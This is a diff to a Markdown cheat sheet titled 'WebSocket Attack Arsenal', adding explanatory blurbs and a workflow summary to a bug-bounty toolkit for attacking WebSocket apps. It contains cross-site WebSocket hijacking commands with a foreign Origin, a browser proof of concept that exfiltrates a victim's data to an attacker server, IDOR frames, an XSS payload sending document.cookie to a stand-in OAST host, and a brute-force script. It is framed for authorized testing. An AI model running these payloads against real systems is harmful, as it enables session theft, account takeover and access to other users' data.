@@ -1,12 +1,45 @@
 # WebSocket Attack Arsenal — Handshake/CSWSH PoCs, Frame-Tamper Payloads & Recipes
 
+**Author:** x8bitranjit
+
 > Companion to `WEBSOCKET_TESTING_GUIDE.md`. **Read the handshake first (cookie-vs-token auth, Origin check, wss), then attack the frames.** Replace `target.com`, `<victim cookie>`/`<A_TOKEN>`, `attacker.example`, `YOUR.oast.fun`. **Authorized targets only; CSWSH/PoCs use YOUR own victim account and exfil to YOUR server; two accounts for IDOR; measured counts for brute; measure-don't-flood for DoS** (guide §21).
 >
 > **Workflow:** find WS (§3) → baseline handshake/auth (§4) → CSWSH (§5) → per-message authz/IDOR (§6) → message injection (§8) → escalate.
 
 ---
 
+## §0.0 — The whole attack in one sequence
+
+*What & when:* the entire WebSocket run on one screen — the **decision spine** every lettered block below plugs into. WebSockets have **two** attack surfaces: **the handshake** (who's allowed to open the socket) and **the message layer** (every frame is untrusted input). Baseline the auth model first, then attack both. Follow the arrows to the matching section.
+
+```
+# ── 1. RECON: find every socket (guide §3) ───────────────────────────────
+DevTools→Network→WS · grep JS: new WebSocket( / io( / SockJS( / signalr · /ws /socket.io /cable /hub · Burp WebSockets
+
+# ── 2. BASELINE the handshake (guide §4) — this decides your whole attack ─
+auth = COOKIE or TOKEN?   ·   Origin validated?   ·   wss:// (encrypted)?   ·   map message types (id/action/rendered/backend)
+
+# ── 3a. HANDSHAKE attacks ────────────────────────────────────────────────
+CSWSH (§5): cookie-auth + NO Origin check + NO CSRF token → attacker page opens socket in victim session → read/send
+            → foreign-Origin oracle (websocat), then CONFIRM in a real browser → data theft / ATO / state change ⭐
+Transport (§7): ws:// cleartext · token-in-URL (logs/Referer leak) · token not re-validated per-message
+
+# ── 3b. MESSAGE-LAYER attacks (frames = untrusted input, often PAST the WAF) ──
+authz/IDOR (§6): swap another user's id in a message (BOLA) · send privileged/admin message types (BFLA) · unauth types
+injection (§8): XSS (rendered chat) · SQLi/NoSQLi (§ query in a frame) · cmdi · SSRF · path-traversal — YOUR other kits, over WS
+abuse (§10-12): rate-limit/brute over WS (no per-message throttle) · DoS (huge/compressed frames) · smuggling/proxy misconfig
+
+# ── 4. PROVE benign, then STOP (guide §19) ───────────────────────────────
+CSWSH → browser PoC exfil to YOUR listener, YOUR victim account · IDOR → two own accounts · brute → measured count
+```
+
+> **Cash-out map (guide §17 severity):** CSWSH + secrets/actions on the stream → **data theft / ATO / state-change as victim** (Critical, CWE-1385/CWE-352) · per-message IDOR/BFLA → **cross-user read/write** (High/Critical) · message injection → whatever the sink gives (XSS/SQLi/RCE, often WAF-invisible) · token-in-URL → **session leak**. Server ignores Origin but browser won't send the cookie cross-site (SameSite)? → not exploitable CSWSH (§16). Full worked run: **guide Appendix D**.
+
+---
+
 ## A. Find & connect (set once)
+> **What & when:** step one — locate the phone lines and get a client on them. Find every `ws(s)://` the app opens (DevTools/JS/Burp), then connect from the CLI mirroring the browser's handshake (Origin + cookie). Everything downstream runs on these connections.
+
 ```bash
 # Find sockets: DevTools→Network→WS, or grep JS for: new WebSocket(  io(  SockJS(  signalr  wss://  /ws  /socket.io  /cable  /hub
 # Connect from CLI (set Origin + cookie to mirror the browser handshake):
@@ -16,6 +49,8 @@ wscat -c 'wss://target.com/ws' -H 'Origin: https://target.com' -H 'Cookie: sessi
 ```
 
 ## B. Handshake / CSWSH oracle — vary the Origin (§5)
+> **What & when:** the fast CSWSH test — dial with the victim's badge but a *foreign* caller-ID stamp and see if the callee still answers authenticated. If a foreign/bypass Origin connects authed (and auth is the cookie), you likely have CSWSH — but this CLI check is only an *oracle*; confirm in a real browser (§F).
+
 ```bash
 # Does it stay AUTHENTICATED with a FOREIGN Origin + the victim cookie? (CLI oracle for CSWSH)
 websocat -H='Origin: https://evil.example'        -H='Cookie: session=<victim>' 'wss://target.com/ws'   # foreign
@@ -27,6 +62,8 @@ websocat                                          -H='Cookie: session=<victim>' 
 ```
 
 ## C. CSWSH browser PoC (host on attacker origin; open as logged-in victim) (§9/§19)
+> **What & when:** the weaponized proof — a page hosted on *your* origin that, when the logged-in victim opens it, dials the target as them, reads their data, fires a state change, and exfils the replies to you. This is the finding; host it cross-site and open it as your own victim test account.
+
 ```html
 <!-- cswsh.html : read the victim's data AND fire a state change, exfil to your server -->
 <script>
@@ -42,6 +79,8 @@ websocat                                          -H='Cookie: session=<victim>' 
 ```
 
 ## D. Auth / authz over WS — IDOR & BFLA in frames (§6)
+> **What & when:** once you're on a call (even your own low-priv account), test whether the server re-checks your badge per sentence. Swap another user's id into a message or invoke a privileged one — if it obeys, that's IDOR/BFLA over the phone line. Confirm the IDOR way: two accounts, A's socket, B's data back.
+
 ```
 # connect as A, then send frames referencing B's ids / privileged actions:
 {"type":"getMessages","conversationId": <B_ID>}        # read B's conversation (IDOR)
@@ -54,6 +93,8 @@ websocat                                          -H='Cookie: session=<victim>' 
 ```
 
 ## E. Message injection — treat every field as untrusted (§8)
+> **What & when:** the phone line tunnels to the backend, and the message handlers often skip the input-cleaning the HTTP forms have. Fire every injection class down each field — XSS (rendered to other users), SQLi/NoSQLi, cmdi/SSRF, path traversal, mass-assign. Same payloads as HTTP, a door frequently left unlocked.
+
 ```
 # Stored/reflected XSS (chat/comment rendered to others):
 {"type":"chat","room":"general","text":"<img src=x onerror=fetch('//YOUR.oast.fun/'+document.cookie)>"}
@@ -71,6 +112,8 @@ websocat                                          -H='Cookie: session=<victim>' 
 ```
 
 ## F. Real-browser CSWSH proof (validity gate) (§15)
+> **What & when:** the gate that turns a `websocat` oracle into a submittable finding. A CLI tool ignores browser rules; a real browser, logged in as the victim, opening your attacker-origin page is the *only* thing that proves the attack. Never report CSWSH on a websocat-only connect.
+
 ```
 1. Host C's cswsh.html on a DIFFERENT origin (https://attacker.example).
 2. In a normal browser (default settings), log in as the VICTIM test account at target.com.
@@ -81,6 +124,8 @@ websocat                                          -H='Cookie: session=<victim>' 
 ```
 
 ## G. Rate-limit / brute over WS (§10)
+> **What & when:** when a login/OTP/coupon check exists over the socket — the guard who counts tries usually watches the HTTP front door, not the phone line. Fire many attempts down one call and count how many are accepted vs the documented HTTP cap; far more = rate-limit bypass → brute → ATO. Bounded, on your own account only.
+
 ```python
 # OTP/login often has NO per-message limit over WS — many attempts on ONE socket:
 import asyncio, websockets, json
@@ -122,6 +167,8 @@ Rails ActionCable /cable · Phoenix Channels · MQTT-over-WS : channel/topic sub
 ```
 
 ## K. Validity checklist (paste per sub-bug) (§15)
+> **What & when:** the last gate before you write it up — match each sub-bug to its required proof. If you can't produce the proof on the right-hand side (real-browser CSWSH, two-account IDOR, a reproducible injection signal, a measured brute count), you don't have that finding yet.
+
 ```
 CSWSH        → attacker-origin page, logged-in victim, default browser → handshake (Origin:attacker) ACCEPTED authed → data exfil/state change. Auth must be a COOKIE.
 IDOR/BFLA-WS → two accounts: A's socket + B's id in a frame → B's data/action back.
